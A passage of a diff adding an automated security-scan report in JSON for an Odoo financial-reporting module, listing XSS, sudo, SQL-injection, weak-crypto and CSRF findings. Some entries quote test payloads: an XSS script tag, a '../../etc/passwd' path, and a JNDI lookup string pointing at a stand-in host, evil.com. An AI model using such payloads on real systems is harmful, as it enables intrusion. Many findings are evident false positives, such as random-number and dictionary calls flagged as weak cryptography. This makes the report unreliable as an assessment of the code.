+        "code_snippet": "        \n        container.innerHTML = html;\n    }"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 363,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        container.innerHTML = '';\n        "
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 366,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        if (alerts.length === 0) {\n            container.innerHTML = '<p class=\"text-muted\">No alerts at this time</p>';\n            return;"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 373,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "            alertDiv.className = `alert alert-${this.getAlertClass(alert.severity)} alert-dismissible fade show`;\n            alertDiv.innerHTML = `\n                <strong>${alert.type}:</strong> ${a"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 406,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        tbody.innerHTML = '';\n        const totalRevenue = customers.reduce((sum, c) => sum + c.total_revenue, 0);"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 412,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "            const row = document.createElement('tr');\n            row.innerHTML = `\n                <td>${customer.customer_name}</td>"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 469,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        html += '</div>';\n        container.innerHTML = html;\n    }"
+      },
+      {
+        "file": "security/",
+        "line": 0,
+        "type": "missing_record_rules",
+        "severity": "MEDIUM",
+        "description": "No record rules defined for data isolation",
+        "code_snippet": "No ir.rule records found"
+      }
+    ],
+    "low": [
+      {
+        "file": "security/",
+        "line": 0,
+        "type": "missing_groups",
+        "severity": "LOW",
+        "description": "No security groups defined",
+        "code_snippet": "No res.groups records found"
+      }
+    ]
+  },
+  "vulnerabilities_by_type": {
+    "missing_access_control": [
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 174,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Verificar persistencia\n        param_value = self.env['ir.config_parameter'].sudo().get_param(\n            'account_financial_report.auto_refresh'"
+      },
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 378,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        for _ in range(100):\n            timeout = self.env['ir.config_parameter'].sudo().get_param(\n                'account_financial_report.cache_timeout'"
+      },
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 381,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            )\n            batch_size = self.env['ir.config_parameter'].sudo().get_param(\n                'account_financial_report.batch_size'"
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 371,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Test b\u00fasqueda con diferentes usuarios\n        manager_search = self.env['account.trial.balance'].with_user(self.account_manager).search([])\n        user_search = self.env['account.trial.bala"
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 372,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        manager_search = self.env['account.trial.balance'].with_user(self.account_manager).search([])\n        user_search = self.env['account.trial.balance'].with_user(self.account_user).search([])\n  "
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 379,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Usuario b\u00e1sico debe tener acceso muy limitado o nulo\n        basic_search = self.env['account.trial.balance'].with_user(self.basic_user).search([])\n        self.assertEqual(len(basic_search)"
+      },
+      {
+        "file": "tests/test_performance_indexes.py",
+        "line": 273,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener todas las compa\u00f1\u00edas\n        companies = self.env['res.company'].search([])\n        "
+      },
+      {
+        "file": "tests/test_multi_company_security.py",
+        "line": 82,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            self.user_multi\n        ).search([])\n        "
+      },
+      {
+        "file": "models/financial_dashboard_template.py",
+        "line": 263,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Incrementar contador de uso\n        self.sudo().usage_count += 1\n        "
+      },
+      {
+        "file": "models/financial_dashboard_add_widget_wizard.py",
+        "line": 134,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        \"\"\"Return available widget types for the interface\"\"\"\n        return self.env['financial.dashboard.widget'].search([])\n"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 435,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        model_dir = os.path.join(\n            self.env['ir.config_parameter'].sudo().get_param('web.base.url'),\n            'ml_models'"
+      },
+      {
+        "file": "models/l10n_cl_f22.py",
+        "line": 519,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener cuentas desde la configuraci\u00f3n\n        impuesto_por_pagar = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_impuesto_renta_por_pagar_id'"
+      },
+      {
+        "file": "models/l10n_cl_f22.py",
+        "line": 525,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        \n        gasto_impuesto = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_gasto_impuesto_renta_id'"
+      },
+      {
+        "file": "models/l10n_cl_f29.py",
+        "line": 501,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener cuentas desde la configuraci\u00f3n\n        iva_por_pagar = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_iva_por_pagar_id'"
+      },
+      {
+        "file": "models/l10n_cl_f29.py",
+        "line": 507,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "\n        iva_debito = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_iva_debito_id'"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 481,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener cuentas desde configuraci\u00f3n\n        ppm_por_pagar_account = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_ppm_por_pagar_id'"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 487,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        \n        gasto_ppm_account = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_gasto_ppm_id'"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 588,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener cuentas\n        ppm_por_pagar_account = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_ppm_por_pagar_id'"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 591,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        )\n        banco_account = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_banco_principal_id'"
+      },
+      {
+        "file": "models/performance_mixin.py",
+        "line": 133,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        \"\"\"\n        return self.env['ir.config_parameter'].sudo().get_param(config_key)\n"
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 258,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "\n                    # Check for .sudo() without proper context\n                    if isinstance(node.func, ast.Attribute):"
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 270,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "                                    description='sudo() used without proper context',\n                                    code_snippet='....sudo()'\n                                )"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 141,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Get analysis first\n        analysis = request.env['account.ratio.analysis.service'].sudo().browse(analysis_id)\n        "
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 147,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            analysis = request.env['account.ratio.analysis.service'].sudo().browse(analysis_id)\n            "
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 223,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Get historical data\n            service = request.env['account.ratio.analysis.service'].sudo()\n            historical_data = service.get_historical_ratios(company_id, ratio_name, periods"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 351,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Check if trained model exists\n            ml_model = request.env['ratio.prediction.ml'].sudo().search([\n                ('company_id', '=', company_id),"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 405,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Get recent analyses with alerts\n            analyses = request.env['account.ratio.analysis.service'].sudo().search([\n                ('company_id', '=', company_id),"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 467,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            analysis = request.env['account.ratio.analysis.service'].sudo().browse(analysis_id)\n            "
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 558,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Store webhook configuration (simplified)\n            config_param = request.env['ir.config_parameter'].sudo()\n            webhook_config = {"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 32,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Obtener servicio\n            service = request.env['analytic.report.service'].sudo()\n            "
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 488,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            service = request.env['analytic.report.service'].sudo()\n            result = service.get_project_dashboard_data(project_ids, months)"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 517,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            \n            service = request.env['analytic.report.service'].sudo()\n            result = service.get_analytic_report_data("
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 203,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener configuraci\u00f3n de ajustes tributarios\n        ajustes_config = self.env['ir.config_parameter'].sudo()\n        "
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 519,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            cache_param = self.env['ir.config_parameter'].sudo()\n            cached_json = cache_param.get_param(f'sii_cache.{cache_key}')"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 556,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            \n            cache_param = self.env['ir.config_parameter'].sudo()\n            cache_param.set_param("
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 574,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            cache_param = self.env['ir.config_parameter'].sudo()\n            "
+      },
+      {
+        "file": "migrations/18.0.6.0.0/post-add-mobile-fields.py",
+        "line": 23,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "    \n    widgets = env['financial.dashboard.widget'].search([])\n    for widget in widgets:"
+      }
+    ],
+    "unsafe_sudo": [
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 174,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 378,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 381,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/financial_dashboard_template.py",
+        "line": 263,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 435,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_f22.py",
+        "line": 519,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_f22.py",
+        "line": 525,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_f29.py",
+        "line": 501,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_f29.py",
+        "line": 507,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 481,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 487,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 588,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 591,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/performance_mixin.py",
+        "line": 133,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 141,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 147,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 223,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 351,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 405,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 467,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 558,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 32,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 488,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 517,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 203,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 519,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 556,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 574,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      }
+    ],
+    "path_traversal": [
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 391,
+        "type": "path_traversal",
+        "severity": "HIGH",
+        "description": "Possible path traversal vulnerability",
+        "code_snippet": "            \"<script>alert('xss')</script>\",\n            \"../../etc/passwd\",\n            \"${jndi:ldap://evil.com/a}\","
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 391,
+        "type": "path_traversal",
+        "severity": "HIGH",
+        "description": "Possible path traversal vulnerability",
+        "code_snippet": "            \"<script>alert('xss')</script>\",\n            \"../../etc/passwd\",\n            \"${jndi:ldap://evil.com/a}\","
+      }
+    ],
+    "sql_injection": [
+      {
+        "file": "tests/test_performance_indexes.py",
+        "line": 83,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "        for index_name in critical_indexes:\n            self.env.cr.execute(\"\"\"\n                SELECT EXISTS ("
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 43,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    r'\\.execute\\(f[\"\\']',  # SQL with f-strings\n                    r'SELECT.*FROM.*WHERE.*\\+',  # Direct SQL concatenation\n                ],"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 174,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "            try:\n                cur.execute(\"\"\"\n                    SELECT"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 348,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    # Verificar si el \u00edndice ya existe\n                    cur.execute(\"\"\"\n                        SELECT EXISTS ("
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 360,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    # Verificar si la tabla existe\n                    cur.execute(\"\"\"\n                        SELECT EXISTS ("
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 384,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    start_time = time.time()\n                    cur.execute(create_query)\n                    self.conn.commit()"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 502,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    for idx_query in mv.get('indexes', []):\n                        cur.execute(idx_query)\n                        self.conn.commit()"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 410,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                try:\n                    cur.execute(f\"ANALYZE {table}\")\n                    self.conn.commit()"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 432,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                try:\n                    cur.execute(f\"ALTER SYSTEM SET {param} = '{value}'\")\n                    self.conn.commit()"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 495,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    # Crear vista materializada\n                    cur.execute(f\"DROP MATERIALIZED VIEW IF EXISTS {mv['name']} CASCADE\")\n                    cur.execute(mv['query'])"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 506,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    # Refrescar vista\n                    cur.execute(f\"REFRESH MATERIALIZED VIEW {mv['name']}\")\n                    self.conn.commit()"
+      },
+      {
+        "file": "migrations/18.0.5.0.1/post-add-performance-indexes.py",
+        "line": 52,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "            # Verificar si la tabla existe\n            self.env.cr.execute(\"\"\"\n                SELECT EXISTS ("
+      },
+      {
+        "file": "migrations/18.0.5.0.1/post-add-performance-indexes.py",
+        "line": 64,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "            # Verificar si el \u00edndice ya existe\n            self.env.cr.execute(\"\"\"\n                SELECT EXISTS ("
+      },
+      {
+        "file": "migrations/18.0.5.0.1/post-add-performance-indexes.py",
+        "line": 109,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "        try:\n            self.env.cr.execute(sql.SQL(\"ANALYZE {}\").format(sql.Identifier(table)))\n            _logger.info(f\"Estad\u00edsticas actualizadas para {table}\")"
+      }
+    ],
+    "command_injection": [
+      {
+        "file": "tests/test_financial_dashboard_wizard.py",
+        "line": 242,
+        "type": "command_injection",
+        "severity": "CRITICAL",
+        "description": "Possible command injection vulnerability",
+        "code_snippet": "\n    def test_dashboard_stats_retrieval(self):\n        \"\"\"Test dashboard statistics retrieval\"\"\""
+      }
+    ],
+    "weak_crypto": [
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 587,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "        return {\n            'gdp_growth': np.random.uniform(1.5, 3.5),\n            'inflation_rate': np.random.uniform(1.0, 3.0),"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 588,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "            'gdp_growth': np.random.uniform(1.5, 3.5),\n            'inflation_rate': np.random.uniform(1.0, 3.0),\n            'interest_rate': np.random.uniform(2.0, 5.0),"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 589,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "            'inflation_rate': np.random.uniform(1.0, 3.0),\n            'interest_rate': np.random.uniform(2.0, 5.0),\n        }"
+      },
+      {
+        "file": "models/performance_mixin.py",
+        "line": 90,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "        key_str = '|'.join(key_parts)\n        return hashlib.md5(key_str.encode()).hexdigest()\n"
+      },
+      {
+        "file": "models/performance_mixin.py",
+        "line": 383,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "\n        return hashlib.md5('|'.join(key_parts).encode()).hexdigest()\n"
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 179,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                codes = month_data.get('codes', {})\n                monthly_totals['sales'] += codes.get('503', 0)\n                monthly_totals['iva_debito'] += codes.get('511', 0)"
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 180,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                monthly_totals['sales'] += codes.get('503', 0)\n                monthly_totals['iva_debito'] += codes.get('511', 0)\n                monthly_totals['iva_credito'] += codes.get('521', 0)"
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 181,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                monthly_totals['iva_debito'] += codes.get('511', 0)\n                monthly_totals['iva_credito'] += codes.get('521', 0)\n                monthly_totals['ppm_paid'] += codes.get('563', "
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 182,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                monthly_totals['iva_credito'] += codes.get('521', 0)\n                monthly_totals['ppm_paid'] += codes.get('563', 0)\n            "
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 186,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "            annual_codes = f22_annual_data.get('codes', {})\n            annual_sales = annual_codes.get('629', 0)\n            annual_ppm = annual_codes.get('639', 0)"
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 187,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "            annual_sales = annual_codes.get('629', 0)\n            annual_ppm = annual_codes.get('639', 0)\n            "
+      },
+      {
+        "file": "models/services/financial_dashboard_service_optimized.py",
+        "line": 85,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "        key_str = '|'.join(key_parts)\n        key_hash = hashlib.md5(key_str.encode()).hexdigest()\n"
+      },
+      {
+        "file": "models/services/trial_balance_service.py",
+        "line": 209,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                if other_code != code and other_code.startswith(code + '.'):\n                    parent_codes.add(code)\n                    break"
+      }
+    ],
+    "xss": [
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 54,
+        "type": "xss",
+        "severity": "HIGH",
+        "description": "Possible XSS vulnerability",
+        "code_snippet": "                    r'document\\.write\\(',  # document.write usage\n                    r'\\|safe(?!\\w)',  # |safe filter in templates\n                ],"
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 54,
+        "type": "xss",
+        "severity": "HIGH",
+        "description": "Possible XSS vulnerability",
+        "code_snippet": "                    r'document\\.write\\(',  # document.write usage\n                    r'\\|safe(?!\\w)',  # |safe filter in templates\n                ],"
+      }
+    ],
+    "csrf": [
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 124,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "                'patterns': [\n                    r'csrf=False',\n                    r'@http\\.route.*methods=\\[[^]]*POST[^]]*\\](?!.*csrf)',"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 22,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/dashboard/export', type='json', auth='user', methods=['POST'])\n    def export_dashboard(self, layout_id, format='pdf', filters=None, options=None):"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 66,
+        "type": "csrf",
